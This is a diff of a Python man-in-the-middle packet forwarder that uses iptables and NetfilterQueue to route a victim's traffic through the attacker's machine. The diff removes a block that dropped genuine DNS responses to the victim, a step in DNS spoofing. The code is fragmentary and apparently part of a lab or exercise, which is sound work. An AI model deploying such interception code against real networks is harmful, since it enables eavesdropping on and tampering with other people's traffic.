@@ -1,13 +1,12 @@
-#!/usr/bin/env python3
 """
 MITM Packet Forwarder using NetfilterQueue
 """
-
 from netfilterqueue import NetfilterQueue
 from scapy.all import *
 import os
 
 class PacketForwarder:
+
     def __init__(self, victim_ip, server_ip, victim_mac, server_mac, interface):
         self.victim_ip = victim_ip
         self.server_ip = server_ip
@@ -32,6 +31,7 @@ class PacketForwarder:
     def setup_iptables(self):
         """Insert iptables rules"""
         print("[*] Setting up iptables rules...")
+
         self.rules = [
             f"iptables -I FORWARD -s {self.victim_ip} -j NFQUEUE --queue-num 0",
             f"iptables -I FORWARD -d {self.victim_ip} -j NFQUEUE --queue-num 0"
@@ -47,6 +47,7 @@ class PacketForwarder:
             f"iptables -D FORWARD -s {self.victim_ip} -j NFQUEUE --queue-num 0",
             f"iptables -D FORWARD -d {self.victim_ip} -j NFQUEUE --queue-num 0"
         ]
+
         for rule in reverse_rules:
             os.system(f"sudo {rule}")
 
@@ -60,13 +61,6 @@ class PacketForwarder:
             if self.packet_count % 100 == 0:
                 print(f"[*] Processed {self.packet_count} packets")
             
-            # Check if packet is DNS response from server to victim
-            if pkt.haslayer(DNS) and pkt.haslayer(UDP) and pkt[DNS].qr == 1:
-                if pkt[IP].dst == self.victim_ip and pkt[UDP].sport == 53:
-                    print("[*] Dropping legitimate DNS response from server")
-                    packet.drop()  # Drop legitimate DNS response so victim never sees it
-                    return
-
             packet.accept()
 
         except Exception as e:
@@ -77,11 +71,11 @@ class PacketForwarder:
         """Main runner function"""
         self.setup_kernel()
         self.setup_iptables()
-
         nfqueue = NetfilterQueue()
         nfqueue.bind(0, self.process_packet)
 
         print("[*] Starting NFQueue processing... Ctrl+C to stop")
+
         try:
             nfqueue.run()
         except KeyboardInterrupt:
